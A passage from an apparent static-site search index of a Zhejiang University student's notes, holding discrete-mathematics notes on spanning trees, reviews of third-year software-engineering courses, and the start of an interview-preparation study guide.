<p>\u5b9e\u9645\u60c5\u51b5\u4f1a\u66f4\u591a</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#5-depth-first-search-in-directed-graph","title":"5) Depth-First search in directed graph","text":"<p>we can use the same way to search this graph, however it may not become a spanning tree.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#115-minimum-spanning-trees","title":"11.5 Minimum Spanning Trees","text":""},{"location":"ZJU-course/Discrete%20Mathematics/#1-introduction-to-spanning-tree_1","title":"1) introduction to spanning tree","text":"<p>If the graph is a weighted graph and one of the spanning trees has the least weight, we called it minimum tree.</p>"},{"location":"ZJU-course/Discrete%20Mathematics/#2-algorithms-for-minimum-spanning-tree","title":"2) Algorithms for minimum spanning tree","text":"<p>\u5b58\u5728\u4e24\u79cd\u4e0d\u540c\u7684\u7b97\u6cd5</p> <p>prim algorithm</p> <p>\u7b97\u6cd5\u4e00\uff1a\u4ece\u6700\u5c0f\u7684\u4e00\u8fb9\u5f00\u59cb\uff0c\u4e0d\u65ad\u5f80\u5916\u6269\uff0c\u6bcf\u6b21\u90fd\u6269\u6700\u5c0f\u7684\u8fb9\uff0c\u5982\u679c\u6700\u5c0f\u7684\u4e0d\u6b62\u4e00\u6761\u5c31\u968f\u4fbf\u627e\u4e00\u6761\u3002</p> <p>\u7b97\u6cd5\u4e8c\uff1a\u4ece\u6700\u5c0f\u7684\u4e00\u6761\u8fb9\u5f00\u59cb\uff0c\u4e0d\u65ad\u5730\u627e\u6574\u5f20\u56fe\u4e2d\u6700\u5c0f\u7684\u8fb9\u52a0\u5165\u8fdb\u6765\uff0c\u53ea\u8981\u6c42\u4e0d\u80fd\u5f62\u6210\u56de\u8def\uff0c\u53ea\u8981\u4e0d\u5f62\u6210\u56de\u8def\u5c31\u4e0d\u65ad\u52a0\u8fdb\u6765\u3002\u76f4\u5230\u8fde\u4e0a\u6240\u6709\u70b9\uff08\u9700\u8981n-1\u6761\u8fb9\uff09</p> <p>\u200d</p> <p>\u200d</p> <p>\u200d</p>"},{"location":"ZJU-course/%E5%A4%A7%E4%B8%89%E4%B8%8B%E8%AF%BE%E7%A8%8B%E7%BB%8F%E9%AA%8C/","title":"\u5927\u4e09\u4e0b\u8bfe\u7a0b\u7ecf\u9a8c","text":"<p>\u8fd9\u5b66\u671f\u8f6f\u5de5\u7684\u8bfe\u7a0b\u4e0d\u591a\uff0c\u5927\u5bb6\u7684\u91cd\u5fc3\u90fd\u9010\u6e10\u8f6c\u79fb\u5230\u4e86\u79d1\u7814\u548c\u5b9e\u4e60\u4e0a\uff0c\u6211\u4e5f\u4e0d\u4f8b\u5916\uff0c\u5982\u4f55\u80fd\u5728\u79d1\u7814\u5b9e\u4e60\u548c\u8bfe\u5185\u4e2d\u7ef4\u6301\u4e00\u4e2a\u6b63\u5e38\u7684\u5e73\u8861\u6210\u4e3a\u4e86\u8fd9\u5b66\u671f\u7684\u4e3b\u9898\u3002</p>"},{"location":"ZJU-course/%E5%A4%A7%E4%B8%89%E4%B8%8B%E8%AF%BE%E7%A8%8B%E7%BB%8F%E9%AA%8C/#_1","title":"\u5927\u89c4\u6a21\u4fe1\u606f\u6280\u672f\u6784\u5efa\u5bfc\u8bba","text":"<p>\u8fd9\u95e8\u8bfe\u662f\u8f6f\u5de5\u7684\u4e3b\u4fee\u8bfe\u7a0b\uff0c\u6211\u662f\u5f20\u5bc5\u8001\u5e08\u73ed\u7684\uff0c\u5f20\u8001\u5e08\u5e73\u65f6\u70b9\u540d\u90fd\u4f1a\u63d0\u524d\u5728\u7fa4\u91cc\u63d0\u9192\uff0c\u867d\u7136\u6211\u4e0d\u77e5\u9053\u8fd9\u4e2a\u70b9\u540d\u6709\u6ca1\u6709\u5360\u671f\u672b\u7684\u5206\u6570\u3002\u5206\u6570\u7684\u5927\u5934\u8fd8\u662f\u6700\u540e\u7684\u5927\u7a0b\uff0c\u8be5\u5927\u7a0b\u662f\u5728Minisql\u7684\u57fa\u7840\u4e0a\u5199\u4e00\u4e2a\u5206\u5e03\u5f0f\u7684\u6570\u636e\u5e93\u7cfb\u7edf\uff0c\u4e00\u822c\u5927\u5bb6\u5c31\u662f\u7528zookeeper+java\u6765\u5b8c\u6210\u4e86\uff0c\u8fd9\u4e2a\u5b9e\u9a8c\u5176\u5b9e\u5de5\u4f5c\u91cf\u4e0d\u7b97\u5c0f\uff0c\u800c\u4e14\u5206\u5e03\u5f0f\u7684\u7cfb\u7edf\u4e5f\u6bd4\u8f83\u96be\u8c03\uff0c\u6211\u4eec\u7ec4\u662f\u4f7f\u7528\u4e86docker\u6765\u6f14\u793a\u5206\u5e03\u5f0f\uff0c\u5f88\u591a\u7ec4\u90fd\u662f\u76f4\u63a5\u4e0a\u4e86\u5404\u81ea\u7684\u7269\u7406\u673a\u6765\u8c03\u8bd5\uff0c\u5efa\u8bae\u5927\u5bb6\u65e9\u70b9\u5f00\u59cb\u3002</p> <p>\u66f4\u5927\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u8fd9\u4e2a\u5927\u7a0b\u7684\u6307\u5bfc\u5199\u7684\u975e\u5e38\u7b80\u5355\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u7ec6\u8282\u548c\u5f97\u5206\u70b9\u7684\u63cf\u8ff0\uff0c\u53ea\u6709\u5be5\u5be5\u51e0\u4e2a\u5206\u5e03\u5f0f\u7684\u672f\u8bed\u6446\u5728\u90a3\uff0c\u7136\u540e\u5f20\u8001\u5e08\u5728\u9a8c\u6536\u7684\u65f6\u5019\u9a8c\u6536\u5f97\u975e\u5e38\u7ec6\u8282\uff0c\u5f20\u8001\u5e08\u4e0d\u770b\u4f60\u81ea\u5df1\u7684\u6f14\u793a\uff0c\u800c\u662f\u76f4\u63a5\u9a8c\u6536\u6307\u5b9a\u7684\u529f\u80fd\uff08\u8fd9\u4e2a\u529f\u80fd\u6ca1\u6709\u5177\u4f53\u51fa\u73b0\u5728\u4efb\u4f55\u6587\u6863\u4e2d\uff09\uff0c\u6211\u4eec\u7ec4\u9a8c\u4e86\u4e24\u4e2a\u70b9\u90fd\u6ca1\u8fc7\uff0c\u4e00\u4e2a\u662fregion server\u7684\u542f\u52a8\u548c\u53d1\u73b0\uff08\u8fd9\u4e2a\u6211\u4eec\u7ec4\u53ea\u5728\u4e00\u5f00\u59cb\u542f\u52a8\u4e86\u591a\u4e2aregion server\u786e\u4fdd\u5907\u4efd\u8db3\u591f\uff0c\u800c\u6ca1\u6709\u65b0\u52a0region server\u7684\u673a\u5236\uff09\uff0c\u4e00\u4e2a\u662f\u5982\u679cSQL\u91cc\u9762\u5e26\u6709\u968f\u673a\u6570\u51fd\u6570\uff0c\u80fd\u5426\u4fdd\u8bc1\u526f\u672c\u91cc\u7684\u968f\u673a\u6570\u662f\u4e00\u81f4\u7684\uff0c\u8bda\u7136\u8fd9\u4e24\u4e2a\u70b9\u90fd\u662f\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u5e94\u8be5\u4fdd\u8bc1\u7684\u7ec6\u8282\uff0c\u4f46\u662f\u7531\u4e8e\u6ca1\u6709\u4efb\u4f55\u660e\u786e\u7684\u8981\u6c42\u548ctest case\uff0c\u5bfc\u81f4\u5728\u6709\u9650\u7684\u65f6\u95f4\u91cc\u5927\u5bb6\u5f88\u96be\u60f3\u5230\u8981\u53bb\u6d4b\u8fd9\u4e9b\u4e1c\u897f\uff08\u56e0\u4e3a\u4f5c\u4e1a\u63d0\u4ea4\u7684\u8981\u6c42\u662f\u81ea\u5df1\u5f55\u5236\u6f14\u793a\u89c6\u9891\uff0c\u5927\u5bb6\u5f80\u5f80\u4f1a\u628a\u66f4\u591a\u7684\u7cbe\u529b\u653e\u5728\u52a0\u529f\u80fd\u4e0a\u9762\uff09\uff0c\u5c31\u6211\u8ba4\u8bc6\u7684\u5404\u4e2a\u7ec4\u4e2d\u5e94\u8be5\u662f\u6ca1\u6709\u4e00\u7ec4\u80fd\u591f\u628a\u9a8c\u6536\u7684\u8fd9\u51e0\u4e2a\u70b9\u90fd\u8dd1\u8fc7\u7684\uff0c\u76f8\u6bd4\u4e4b\u4e0b\u5176\u4ed6\u73ed\u7684\u9a8c\u6536\u53c8\u662f\u975e\u5e38\u7684\u6c34\uff0c\u57fa\u672c\u8fc7\u4e00\u904d\u6f14\u793a\u5c31\u597d\u4e86\uff0c\u6700\u540e\u5f97\u5206\u679c\u4e0d\u5176\u7136\u53c8\u548c\u5176\u4ed6\u73ed\u7684\u540c\u5b66\u5dee\u4e86\u4e0d\u5c11\uff0c\u4e0d\u8fc7\u5f20\u8001\u5e08\u672c\u4eba\u8fd8\u662f\u975e\u5e38nice\u7684\uff0c\u636e\u8bf4\u8fd8\u662f\u8d85\u7b97\u961f\u7684\u6307\u5bfc\u8001\u5e08\uff0c\u5bf9\u4e8e\u8fd9\u4e2a\u65b9\u5411\u5e94\u8be5\u76f8\u5f53\u6709\u7ecf\u9a8c\uff0c\u5e76\u4e14\u5728\u5f97\u77e5\u5927\u5bb6\u6709\u5f88\u591a\u7ec4\u6765\u4e0d\u53ca\u5b9e\u73b0\u529f\u80fd\u7684\u65f6\u5019\u8fd8\u628a\u9a8c\u6536\u7684\u65e5\u671f\u5ef6\u4e86\u4e00\u4e0b\uff0c\u5982\u679c\u4f60\u8db3\u591f\u6709\u5b9e\u529b\u5e76\u4e14\u613f\u610f\u5728\u8fd9\u95e8\u8bfe\u4e0a\u6295\u5165\u65f6\u95f4\uff0c\u4e5f\u672a\u5c1d\u4e0d\u53ef\u4e00\u8bd5\u3002</p> <p>\u5206\u5e03\u5f0f\u7684\u5185\u5bb9\u786e\u5b9e\u662f\u8ba1\u7b97\u673a\u4e13\u4e1a\u4e2d\u975e\u5e38\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u5c24\u5176\u662f\u73b0\u5728AI\u6b63\u706b\uff0c\u5927\u89c4\u6a21\u8bad\u7ec3\u4e2d\u7684\u591a\u673a\u591a\u5361\u4e5f\u662f\u627f\u88ad\u4f20\u7edf\u7cfb\u7edf\u4e2d\u7684\u5206\u5e03\u5f0f\u601d\u60f3\uff0c\u786e\u5b9e\u503c\u5f97\u8ba4\u771f\u5b66\u4e00\u4e0b\uff0c\u4f46\u662f\u7f51\u4e0a\u7684\u4f18\u8d28\u8d44\u6599\u4e5f\u5f88\u591a\uff0c\u662f\u5426\u6709\u5fc5\u8981\u5728\u8fd9\u95e8\u8bfe\u4e0a\u6295\u5165\u5927\u91cf\u7684\u65f6\u95f4\uff0c\u5927\u5bb6\u6700\u597d\u8fd8\u662f\u81ea\u884c\u5224\u65ad\u3002</p>"},{"location":"ZJU-course/%E5%A4%A7%E4%B8%89%E4%B8%8B%E8%AF%BE%E7%A8%8B%E7%BB%8F%E9%AA%8C/#_2","title":"\u5927\u89c4\u6a21\u4fe1\u606f\u6280\u672f\u6784\u5efa\u8bd5\u9a8c","text":"<p>\u8fd9\u95e8\u8bfe\u572898\u4e0a\u7684\u4fe1\u606f\u6bd4\u8f83\u5c11\uff0c\u4e00\u53e5\u8bdd\u603b\u7ed3\u5c31\u662f\u4e8b\u5c11\u5206\u9ad8\uff0c\u6211\u77e5\u9053\u7684\u540c\u5b66\u5927\u90e8\u5206\u90fd\u662f\u62ff\u5230\u4e86\u9ad8\u5206\uff0c\u5e76\u4e14\u5e73\u65f6\u4e0a\u8bfe\u4e0d\u9700\u8981\u90fd\u53bb\uff08\u672c\u8d28\u4e0a\u8fd9\u95e8\u8bfe\u5c5e\u4e8e\u4e0a\u673a\u8bfe\uff09\uff0c\u7ec4\u5185\u53ea\u9700\u8981\u6709\u540c\u5b66\u53bb\u4e86\u5373\u53ef\uff0c\u8fd9\u95e8\u8bfe\u6700\u540e\u7684\u8981\u6c42\u662f\u5199\u4e00\u4e2a\u524d\u540e\u7aef\u9879\u76ee\uff0c\u5341\u4e2a\u4eba\u5de6\u53f3\u7684\u961f\u4f0d\uff0c\u5176\u5b9e\u8fd8\u633a\u597d\u5212\u6c34\u7684\uff0c\u8001\u5e08\u4f1a\u7528\u6807\u51c6\u7684\u5f00\u53d1\u6d41\u7a0b\u8981\u6c42\u5927\u5bb6\uff0c\u5305\u62ec\u9879\u76ee\u7ba1\u7406git\uff0c\u4efb\u52a1\u7ba1\u7406pingcode\uff0cCICD\u7684\u6d4b\u8bd5\uff0cdocker\u914d\u7f6e\uff0c\u538b\u529b\u6d4b\u8bd5\u7b49\u7b49\uff0c\u57fa\u672c\u4e0a\u5206\u914d\u5230\u6bcf\u4e2a\u4eba\u8eab\u4e0a\u7684workload\u4e0d\u662f\u5f88\u5927\uff0c\u8fd9\u4e5f\u5f97\u76ca\u4e8e\u6211\u4eec\u7ec4\u5927\u4f6c\u4e91\u96c6\uff0c\u5982\u679c\u7ec4\u5458\u6446\u70c2\u7684\u592a\u591a\u7684\u8bdd\u4e5f\u4f1a\u5bfc\u81f4\u4e2a\u4eba\u7684\u5de5\u4f5c\u91cf\u589e\u52a0\uff0c\u4e0d\u8fc7\u8001\u5e08\u9a8c\u6536\u4e5f\u4e0d\u538b\u529b\uff0c\u7ed9\u5206\u4e5f\u597d\uff0c\u603b\u4e4b\u5c31\u662f\u63a8\u8350\u9009\u8bfe</p> <p>\u8001\u5e08\u4e0a\u8bfe\u63a8\u8350\u4f7f\u7528AI\u8fdb\u884c\u8f85\u52a9\u7f16\u7a0b\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c3d\u60c5\u4f7f\u7528\u201c\u5077\u61d2\u201d\u5927\u6cd5</p>"},{"location":"ZJU-course/%E5%A4%A7%E4%B8%89%E4%B8%8B%E8%AF%BE%E7%A8%8B%E7%BB%8F%E9%AA%8C/#_3","title":"\u4e60\u6982","text":"<p>\u4e60\u6982\u6211\u662f\u718a\u536b\u5e73\u8001\u5e08\u73ed\u7684\uff0c\u5173\u4e8e\u4e60\u6982\u7684\u7ecf\u9a8c\u53ea\u80fd\u8bf4\u524d\u4eba\u4e4b\u8ff0\u5907\u77e3\uff0c\u603b\u7ed3\u5c31\u662f\u7ec4\u4e2a\u9760\u8c31\u7684\u961f\u4f0d\uff0c\u7136\u540e\u4e00\u5b9a\u8981\u4e00\u5f00\u59cb\u5c31\u8bf4\u597d\u5177\u4f53\u7684\u5206\u6570\u5212\u5206\uff0c\u4e0d\u8981\u6700\u540e\u5728\u5206\u5206\u6570\u7684\u65f6\u5019\u6495\u903c\uff0c\u5173\u4e8e\u671f\u672b\u8003\u8bd5\u7684\u8bdd\uff0c\u5176\u5b9e\u4e2a\u4eba\u611f\u89c9\u53ea\u6709\u8bfe\u672c\u662f\u6709\u7528\u7684\uff0c\u5176\u4ed6\u90fd\u5b8c\u5168\u6765\u4e0d\u53ca\u7ffb\uff0c\u7136\u540e98\u4e0a\u7684\u8d44\u6599\u53ef\u4ee5\u597d\u597d\u627e\u627e\uff0c\u4e0d\u8981\u627e\u90a3\u4e9b\u66f4\u591a\u7684\u8d44\u6599\uff0c\u800c\u662f\u8981\u627e\u90a3\u4e9b\u8bfe\u672c\u77e5\u8bc6\u70b9\u7684\u68b3\u7406\u548c\u7d22\u5f15\uff0c\u5e76\u4e14\u8096\u80cc\u8bf5\u624b\u518c\u4e5f\u53ef\u4ee5\u4e00\u7528\uff0c\u56e0\u4e3a\u7a7a\u767d\u7684\u8bfe\u672c\u5f88\u5bb9\u6613\u627e\u4e0d\u5230\u91cd\u70b9\uff0c\u50cf\u8096\u80cc\u8bf5\u624b\u518c\u8fd9\u79cd\u91cc\u9762\u90fd\u662f\u77e5\u8bc6\u70b9\u5c31\u5f88\u597d\u7ffb\uff0c\u6700\u540e\u5c31\u662f\u8981\u7ec3\u7ec3\u5b57\uff0c\u8ba1\u7b97\u673a\u4e13\u4e1a\u7684\u5927\u5bb6\u57fa\u672c\u5230\u4e60\u6982\u8003\u8bd5\u4e4b\u524d\u5df2\u7ecf\u4e00\u4e2a\u5b66\u671f\u6ca1\u5199\u8fc7\u5b57\u662f\u5f88\u6b63\u5e38\u7684\u60c5\u51b5\uff0c\u7136\u540e\u4e60\u6982\u8003\u8bd5\u7684\u65f6\u95f4\u57fa\u672c\u662f\u975e\u5e38\u7684\u7d27\u5f20\uff0c\u6700\u597d\u53ef\u4ee5\u5728\u8003\u524d\u51e0\u5929\u5199\u5199\u5b57\uff0c\u7ec3\u7ec3\u624b\u3002</p>"},{"location":"ZJU-course/%E5%A4%A7%E4%B8%89%E4%B8%8B%E8%AF%BE%E7%A8%8B%E7%BB%8F%E9%AA%8C/#_4","title":"\u8ba1\u7b97\u673a\u79d1\u5b66\u601d\u60f3\u53f2","text":"<p>\u539f\u672c\u662f\u4e0d\u70b9\u540d\u7684\u8bfe\u7a0b\uff0c\u8fd9\u5b66\u671f\u7a81\u7136\u5f00\u59cb\u70b9\u540d\uff0c\u4e00\u6b21\u70b9\u540d\u4e0d\u5230\u6263\u5206\u53ca\u5176\u4e25\u91cd\uff0c\u7b2c\u4e00\u8282\u8bfe\u8001\u5e08\u8bf4\u4e86\u6bcf\u8282\u8bfe\u90fd\u4f1a\u70b9\u540d\uff0c\u5b9e\u5219\u5230\u4e86\u540e\u9762\u6839\u672c\u6ca1\u51e0\u4e2a\u8001\u5e08\u70b9\u8fc7\u540d\uff0c\u52a0\u4e0a\u4e00\u4e2a\u63d2\u5ea7\u6ca1\u7535\u7684\u95ee\u9898\u4e00\u5b66\u671f\u4e86\u90fd\u6ca1\u6709\u89e3\u51b3\uff0c\u5728\u4e00\u4e2a\u53c8\u70ed\u53c8\u95f7\u53c8\u6ca1\u7535\u7684\u6559\u5e08\u5750\u4e00\u4e2a\u4e0b\u5348\u751a\u662f\u96be\u71ac\uff0c\u6240\u5e78\u7684\u662f\u5176\u5b9e\u8fd9\u95e8\u8bfe\u7684\u5185\u5bb9\u8fd8\u7b97\u4e0d\u9519\uff0c\u5404\u4e2a\u8001\u5e08\u4f1a\u4ecb\u7ecd\u4ed6\u4eec\u4e3b\u653b\u7684\u65b9\u5411\uff0c\u5927\u5bb6\u53ef\u4ee5\u9009\u81ea\u5df1\u7684\u611f\u5174\u8da3\u7684\u65b9\u5411\u542c\u542c\uff0c\u5982\u679c\u4f60\u60f3\u8981\u627e\u67d0\u4e2a\u8001\u5e08\u8bfb\u7814\u6ca1\u51c6\u8fd9\u662f\u4e2a\u5f88\u597d\u7684\u4ea4\u6d41\u673a\u4f1a\u3002</p> <p>\u8bfe\u7a0b\u7684\u5de5\u4f5c\u91cf\u662f\u4e00\u4e2a\u4e09\u5206\u949f\u7684\u5c0f\u7ec4\u5c55\u793a\u548c\u4e2a\u4eba\u8bba\u6587\uff0c\u5927\u5bb6\u6ce8\u610f\u8bba\u6587\u683c\u5f0f\u7f8e\u89c2\u975e\u5e38\u91cd\u8981\uff0c\u4e24\u4e09\u4e2a\u52a9\u6559\u7edd\u5bf9\u4e0d\u53ef\u80fd\u7cbe\u901a\u8fd9\u95e8\u8bfe\u7684\u6240\u6709\u65b9\u5411\uff0c\u56e0\u6b64\u57fa\u672c\u53ef\u4ee5\u8ba4\u4e3a\u8bba\u6587\u7684\u7f8e\u89c2\u8fdc\u6bd4\u8bba\u6587\u7684\u5185\u5bb9\u66f4\u91cd\u8981\uff0c\u53ef\u4ee5\u53bb\u53c2\u8003\u4e00\u4e0b\u6302\u5728Arxiv\u4e0a\u7684\u4e00\u4e9bsurvey\u7684\u6392\u7248\uff0c\u73b0\u5728AI\u751f\u6210Latex\u4e5f\u505a\u7684\u4e0d\u9519\uff0cGemini Deepresearch+Overleaf\uff0c\u53ef\u4ee5\u5feb\u901f\u5f97\u5230\u4e00\u4e2a\u4e0d\u9519\u7684\u6392\u7248\uff0c\u81f3\u4e8e\u8fd9\u4e2a\u5c55\u793a\u6211\u611f\u89c9\u5927\u5bb6\u5dee\u5f02\u4e0d\u5927\uff0c\u56e0\u4e3a\u540c\u7ec4\u4e4b\u95f4\u7684\u670b\u53cb\u5f97\u5206\u5dee\u8ddd\u6bd4\u8f83\u5927\uff0c\u611f\u89c9\u6838\u5fc3\u5dee\u5f02\u8fd8\u662f\u5728\u4e2a\u4eba\u8bba\u6587\u4e0a\u3002</p>"},{"location":"ZJU-course/%E5%A4%A7%E4%B8%89%E4%B8%8B%E8%AF%BE%E7%A8%8B%E7%BB%8F%E9%AA%8C/#_5","title":"\u5927\u6570\u636e\u5b58\u50a8\u6280\u672f","text":"<p>\u5c31\u672c\u4eba\u8eab\u8fb9\u7edf\u8ba1\u5b66\u6765\u8bf4\uff0c\u4eca\u5e74\u7684\u7ed9\u5206\u7a81\u7136\u5947\u5dee\u65e0\u6bd4\uff0c\u672c\u4eba\u662f\u7ec4\u957f\u5e76\u4e14\u6709\u53d1\u8a00\u52a0\u5206\uff0c\u80fd\u6709\u7684\u52a0\u5206\u90fd\u6709\u4e86\uff0c\u6700\u540e\u7684\u5206\u6570\u4e5f\u662f\u5dee\u5f3a\u4eba\u610f\uff0c\u4e86\u89e3\u4e86\u4e00\u4e0b\u8eab\u8fb9\u670b\u53cb\u7684\u60c5\u51b5\u66f4\u662f\u7cdf\u7cd5\uff0c\u56e0\u6b64\u5728\u610f\u6210\u7ee9\u7684\u4e0d\u5efa\u8bae\u9009\u3002</p> <p>\u8fd9\u95e8\u8bfe\u5e73\u65f6\u4e0d\u70b9\u540d\uff0c\u53ef\u53bb\u53ef\u4e0d\u53bb\uff0c\u6700\u540e\u7684\u5206\u6570\u5360\u6bd4\u5168\u5728\u6700\u540e\u7684\u4e00\u4e2a\u5c0f\u7ec4\u5c55\u793a\u4e0a\uff0c\u8981\u505a\u4e00\u4e2apre\u548c\u5199\u4e00\u4efd\u8bbe\u8ba1\u62a5\u544a\uff0c\u53ef\u4ee5\u8bf4\u5de5\u4f5c\u91cf\u975e\u5e38\u5f97\u5c0f\uff0c\u5982\u679c\u662f\u5927\u56db\u7f3a\u5b66\u5206\u7684\u8bdd\uff0c\u63a8\u8350\u53ef\u4ee5\u9009</p>"},{"location":"ZJU-course/%E5%A4%A7%E4%B8%89%E4%B8%8B%E8%AF%BE%E7%A8%8B%E7%BB%8F%E9%AA%8C/#_6","title":"\u6570\u5b66\u8f6f\u4ef6","text":"<p>\u6ca1\u9519\u5c31\u662f\u738b\u4f55\u5b87\u8001\u5e08\u5f00\u8bbe\u7684\u8bfe\u7a0b\uff0c\u662f\u6570\u9662\u7684\u8bfe\u7a0b\uff0c\u542c\u95fb\u7ed9\u5206\u4e0d\u9519\u9009\u6765\u505a\u8de8\u4e13\u4e1a\uff0c\u662f\u4e00\u95e8\u4ee4\u4eba\u60ca\u559c\u7684\u597d\u8bfe\uff0c\u5e73\u65f6\u4e0d\u70b9\u540d\uff0c\u6ca1\u6709\u671f\u672b\u8003\u8bd5\uff0c\u5206\u6570\u6784\u6210\u662f\u5c0f\u4f5c\u4e1a+\u9879\u76ee\u4f5c\u4e1a\uff0c\u6709\u4ee5\u4e0b\u4f18\u52bf</p> <p>\u9f13\u52b1AI\u7f16\u7a0b\uff0c\u5de5\u4f5c\u91cf\u4e0d\u7b97\u5927\uff08Cursor\u7684Agent\u6a21\u5f0f\u89e3\u51b3\u8fd9\u4e9b\u9879\u76ee\u633a\u597d\u7528\u7684\uff09</p> <ul> <li>\u4f5c\u4e1a\u6279\u6539\u5b8c\u9a6c\u4e0a\u51fa\u5206\uff0c\u53ef\u4ee5\u968f\u65f6\u611f\u77e5\u81ea\u5df1\u5f53\u524d\u7684\u5206\u6570\u72b6\u6001</li> <li>\u4f5c\u4e1a\u548c\u9879\u76ee\u4f5c\u4e1a\u90fd\u662f\u591a\u6b21\u53d6\u9ad8\uff0c\u5e76\u4e14\u6709bonus\uff0c\u5bb9\u9519\u5f88\u9ad8</li> </ul> <p>\u552f\u4e00\u8981\u6ce8\u610f\u7684\u662f\u5982\u679c\u8bf4\u4f5c\u4e1a\u5728\u52a9\u6559\u7535\u8111\u65e0\u6cd5\u901a\u8fc7\u7f16\u8bd1\u5c31\u4f1a\u5f97\u4f4e\u5206\uff0c\u53ea\u8981\u6ce8\u610f\u8fd9\u4e2a\u70b9\uff0c\u8fd9\u95e8\u8bfe\u5f97\u6ee1\u7ee9\u95ee\u9898\u4e0d\u5927\uff0c\u6211\u8eab\u8fb9\u6709\u5404\u4e2a\u4e13\u4e1a\u7684\u670b\u53cb\u4eec\u90fd\u9009\u4e86\u8fd9\u95e8\u8bfe\uff0c\u5927\u90e8\u5206\u90fd\u662f\u6ee1\u5206</p> <p>\u8f6c\u8ff098\u4e0a\uff0c\u6570\u8f6f\u52a9\u6559\u4eec\u7684\u8bc4\u8bba\uff0c\u6570\u8f6f\u5373\u5c06\u6539\u9769\uff0c\u4f30\u8ba1\u4f1a\u5f15\u5165\u671f\u672b\u8003\uff0c\u8fd9\u4e9b\u7ecf\u9a8c\u76ee\u524d\u5df2\u7ecf\u6ca1\u6709\u53c2\u8003\u4ef7\u503c\u4e86</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/","title":"\u8f6f\u5de5\u9762\u8bd5\u51c6\u5907\u8d44\u6599","text":"<p>\u9762\u8bd5\u51c6\u5907</p> <p>\u672c\u7bc7\u6587\u7ae0\u662f\u6211\u6839\u636e\u81ea\u8eab\u5728\u5927\u4e00\u4e0a\u51c6\u5907\u8f6f\u5de5\u5206\u6d41\u9762\u8bd5\u7ecf\u9a8c\u6574\u7406\u7684\u4e00\u7bc7\u7b80\u5355\u7684\u8d44\u6599\uff0c\u91cc\u9762\u6ca1\u6709\u592a\u591a\u7ec6\u8282\u7684\u63cf\u8ff0\uff0c\u5927\u6982\u8bf4\u660e\u4e86\u6211\u8ba4\u4e3a\u9762\u8bd5\u9700\u8981\u51c6\u5907\u7684\u51e0\u4e2a\u65b9\u5411\uff0c\u4ee5\u53ca\u5982\u4f55\u51c6\u5907\u3002\u5185\u5bb9\u6bd4\u8f83\u6742\uff0c\u4f46\u662f\u9996\u5148\u7684\u5efa\u8bae\u662f\uff0c\u5982\u679c\u662f\u4ece\u6691\u5047\u5f00\u59cb\u51c6\u5907\u7684\uff0c\u5f3a\u70c8\u5efa\u8bae\u5b66\u4e60UCB(\u7f8e\u56fd\u52a0\u5dde\u5927\u5b66\u4f2f\u514b\u5229\u5206\u6821)\u7684CS61\u7cfb\u5217\u7684\u516c\u5f00\u8bfe\uff0c\u5206\u522b\u662fCS61A,CS61B,CS61C,\u5bf9\u5e94\u7f16\u7a0b\u5165\u95e8\uff0c\u6570\u636e\u7ed3\u6784\uff0c\u8ba1\u7b97\u673a\u7ec4\u6210\u4e09\u5927\u5757\u57fa\u7840\u77e5\u8bc6\uff0c\u5c31\u4ece\u524d\u5f80\u540e\u5b66\u5373\u53ef \u6ce8\uff1a\u8fd9\u91cc\u7ed9\u51fa\u7684\u8981\u6c42\u90fd\u662f\u6700\u4f4e\u8981\u6c42\uff0c\u51c6\u5907\u662f\u51c6\u5907\u4e0d\u5b8c\u7684\uff08\u60b2</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99/#0","title":"0.\u4e2a\u4eba\u63a8\u8350\u7684\u5b66\u4e60\u8def\u7ebf","text":"<ol> <li>\u8ba1\u7b97\u673a\u901f\u6210\u8bfe \u79d1\u666e\u6027\u8d28\u7684\u89c6\u9891\uff0c\u6709\u7cbe\u826f\u7684\u7ffb\u8bd1\uff0c\u6ca1\u6709\u5b66\u4e60\u96be\u5ea6\uff0c\u4f46\u662f\u8986\u76d6\u8303\u56f4\u5f88\u5e7f\uff0c\u8bb2\u7684\u4e5f\u901a\u4fd7\u6613\u61c2\uff0c\u6ca1\u5fc5\u8981\u4e00\u6b21\u6027\u770b\u5b8c\uff0c\u53ef\u4ee5\u770b\u4e2a\u51e0\u7ae0\u627e\u4e2a\u611f\u89c9\uff0c\u540e\u7eed\u8bfe\u7a0b\u5b66\u4e60\u4e2d\u53ef\u4ee5\u7a7f\u63d2\u7740\u770b</li> <li>CS61A \u4f2f\u514b\u5229\u7684\u8ba1\u7b97\u673a\u5165\u95e8\u8bfe\u7a0b(\u9700\u8981\u7ffb\u5899\uff0c\u8bf7\u81ea\u884c\u627e\u5de5\u5177)\uff0c\u7406\u8bba\u4e0a\u6765\u8bf4\u4e0d\u9700\u8981\u4efb\u4f55\u8ba1\u7b97\u673a\u57fa\u7840\uff0c\u8bb2\u7684\u975e\u5e38\u901a\u4fd7\u6613\u61c2\uff0c\u4f46\u662f\u8986\u76d6\u4e86Python\u57fa\u7840\uff0c\u51fd\u6570\u5f0f\u7f16\u7a0b\uff0cSQL\u548c\u7f16\u8bd1\u539f\u7406\u57fa\u7840\u7b49\u5185\u5bb9\uff0c\u6ce8\u610f\u4e00\u5b9a\u8981\u505alab\u548cProject\uff0c\u8fd9\u4e9b\u624d\u662f\u8bfe\u7a0b\u7684\u7cbe\u534e\u3002\u4f46\u662f\u5982\u679c\u4f60\u8fd8\u662f\u89c9\u5f97\u82f1\u6587\u6388\u8bfe\u6709\u96be\u5ea6\uff0c\u4f60\u4e5f\u53ef\u4ee5\u770b\u7fc1\u607a\u7684C\u8bed\u8a00\uff0c\u8fd9\u4e2a\u89c6\u9891\u53ef\u4ee5\u5e2e\u4f60\u5f88\u597d\u5730\u5e94\u4ed8C\u7a0b\u5e8f\u8bbe\u8ba1\u8bfe\u7684\u671f\u672b\u8003\u8bd5\uff0c\u4f46\u662f\u5728\u8ba1\u7b97\u673a\u5165\u95e8\u7684\u89d2\u5ea6\u5c31\u5b8c\u5168\u4e0d\u5982CS61A\u4e86\uff0c\u5e76\u4e14\u8ba1\u7b97\u673a\u662f\u6c